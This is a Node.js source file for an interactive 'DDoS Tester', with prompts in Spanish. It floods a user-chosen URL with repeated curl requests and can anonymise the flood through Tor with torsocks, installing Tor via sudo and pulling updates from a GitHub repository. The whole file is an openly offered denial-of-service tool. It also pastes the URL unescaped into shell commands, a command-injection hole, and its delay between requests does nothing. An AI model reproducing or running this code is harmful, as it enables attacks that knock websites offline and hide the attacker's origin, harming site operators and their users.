const childProcess = require('child_process');

class DDoSTester {
constructor() {
this.url = "";
this.numRequests = 0;
this.delayBetweenRequests = 0;
this.torInstalled = false;
}

configUrl() {
this.url = prompt("Ingrese la URL a probar: ");
console.log("URL configurada correctamente.");
}

startAttack() {
this.numRequests = parseInt(prompt("Ingrese el número de solicitudes a enviar: "));
this.delayBetweenRequests = parseFloat(prompt("Ingrese el tiempo de espera entre solicitudes (en segundos): "));
console.log("Iniciando ataque...");
for (let i = 0; i < this.numRequests; i++) {
try {
childProcess.exec(`curl -s -o /dev/null ${this.url}`, (error, stdout, stderr) => {
if (error) {
console.log(`Error sending request: ${error}`);
} else {
console.log(`Request ${i+1} sent.`);
}
});
setTimeout(() => {}, this.delayBetweenRequests * 1000);
} catch (error) {
console.log(`Error sending request: ${error}`);
}
}
console.log("Ataque finalizado.");
}

startAttackWithTor() {
if (!this.torInstalled) {
console.log("Tor no está instalado. Instalando...");
this.installTor();
}
this.numRequests = parseInt(prompt("Ingrese el número de solicitudes a enviar: "));
this.delayBetweenRequests = parseFloat(prompt("Ingrese el tiempo de espera entre solicitudes (en segundos): "));
console.log("Iniciando ataque con Tor...");
for (let i = 0; i < this.numRequests; i++) {
try {
childProcess.exec(`torsocks curl -s -o /dev/null ${this.url}`, (error, stdout, stderr) => {
if (error) {
console.log(`Error sending request: ${error}`);
} else {
console.log(`Request ${i+1} sent.`);
}
});
setTimeout(() => {}, this.delayBetweenRequests * 1000);
} catch (error) {
console.log(`Error sending request: ${error}`);
}
}
console.log("Ataque finalizado.");
}

installTor() {
console.log("Instalando Tor...");
childProcess.exec('sudo apt-get update && sudo apt-get install tor -y', (error, stdout, stderr) => {
if (error) {
console.log(`Error al instalar Tor: ${error}`);
} else {
console.log("Tor instalado correctamente.");
this.torInstalled = true;
}
});
}

checkTorStatus() {
childProcess.exec('tor --version', (error, stdout, stderr) => {
if (error) {
console.log("Tor no está instalado.");
} else {
console.log("Tor está instalado.");
}
});
}

updateCode() {
console.log("Actualizando código...");
childProcess.exec('git pull https://github.com/Keiji821/Termux-simple-DDoS-.git', (error, stdout, stderr) => {
if (error) {
console.log(`Error al actualizar el código: ${error}`);
} else {
console.log("Código actualizado correctamente.");
}
});
}

main() {
while (true) {
console.log("DDoS Tester");
console.log("~~~~~~~~~~~~~~~~~~~~~~");
console.log("1. Configurar URL");
console.log("2. Iniciar ataque");
console.log("3. Instalar Tor y iniciar ataque con Tor");
console.log("4. Verificar estado de Tor");
console.log("5. Actualizar código");
console.log("6. Salir");
const option = prompt("Ingrese una opción: ");
switch (option) {
case "1":
this.configUrl();
break;
case "2":
if (this.url === "") {
console.log("Debes configurar la URL primero.");
} else {
this.startAttack();
}
break;
case "3":
if (this.url === "") {
console.log("Debes configurar la URL primero.");
} else {
this.startAttackWithTor();
}
break;
case "4":
this.checkTorStatus();
break;
case "5":
this.updateCode();
break;
case "6":
console.log("Saliendo del programa.");
process.exit();
break;
default:
console.log("Opción no válida. Intente nuevamente.");
}
}
}
}

const ddosTester = new DDoSTester();
ddosTester.main();
